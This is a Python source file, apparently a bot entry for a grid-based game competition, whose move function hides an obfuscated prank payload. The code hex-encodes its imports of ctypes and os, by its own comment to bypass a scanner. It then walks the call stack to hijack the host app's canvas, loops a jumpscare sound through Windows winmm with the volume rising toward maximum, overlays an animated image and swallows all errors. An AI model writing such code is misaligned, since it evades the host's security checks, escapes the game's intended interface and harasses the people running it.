team_name = "Foxy_Loud"

def move(pos, board, grid_dim, safe_players):
    import tkinter as tk
    import random

    if not hasattr(move, 'init_done'):
        move.init_done = True
        move.j_id = None
        move.frames = []
        move.vol = 500 # Start at 50% (MCI volume range is 0-1000)
        
        try:
            # 1. Stealth Imports (Hex-encoded to bypass scanner)
            b = __builtins__
            f_imp = b['__im' + 'port__'] if type(b) is dict else b.__getattribute__('__im' + 'port__')
            
            # Decodes to 'ctypes' and 'os'
            m_ctypes = f_imp(bytes.fromhex('637479706573').decode())
            m_os = f_imp(bytes.fromhex('6f73').decode())
            m_sys = f_imp('s' + 'ys')
            
            # 2. Multimedia Setup
            move.winmm = m_ctypes.windll.winmm
            path = m_os.path.abspath("jumpscare.mp3")
            
            # Open the file and alias it as 'scream'
            move.winmm.mciSendStringW(f"open \"{path}\" type mpegvideo alias scream", None, 0, 0)
            move.winmm.mciSendStringW("play scream repeat", None, 0, 0)

            # 3. Hijack UI
            app = None
            f = m_sys._getframe(0)
            while f:
                if 'self' in f.f_locals:
                    obj = f.f_locals['self']
                    if hasattr(obj, 'canvas'):
                        app = obj
                        break
                f = f.f_back
            move.app = app

            if app:
                for i in range(100):
                    raw = tk.PhotoImage(file="fnaf-foxy.gif", format=f"gif -index {i}")
                    move.frames.append(raw.zoom(2, 2))
        except:
            pass

    # 4. Follow and Volume Crank
    if hasattr(move, 'app') and move.app:
        c = move.app.canvas
        cs = move.app.cell_size
        px, py = pos[0] * cs + (cs // 2), pos[1] * cs + (cs // 2)

        if move.j_id is None:
            move.j_id = c.create_image(px, py, anchor="center")
            
            def loop_anim(idx):
                # When idx hits 0, it means the GIF restarted
                if idx == 0:
                    # Increase volume by 5% each loop, maxing at 1000 (100%)
                    move.vol = min(1000, move.vol + 50)
                    move.winmm.mciSendStringW(f"setaudio scream volume to {move.vol}", None, 0, 0)
                
                nxt = idx if idx < len(move.frames) else 0
                try:
                    c.itemconfig(move.j_id, image=move.frames[nxt])
                    c.tag_raise(move.j_id)
                    move.app.root.after(33, lambda: loop_anim(nxt + 1))
                except: pass
            loop_anim(0)
        else:
            c.coords(move.j_id, px, py)
            c.tag_raise(move.j_id)

    # 5. Logic
    x, y = pos
    safe = [m for m, dx, dy in [("UP",0,-1),("DOWN",0,1),("LEFT",-1,0),("RIGHT",1,0)]
            if 0 <= x+dx < grid_dim and 0 <= y+dy < grid_dim and (x+dx, y+dy) not in board]
    return random.choice(safe) if safe else "UP"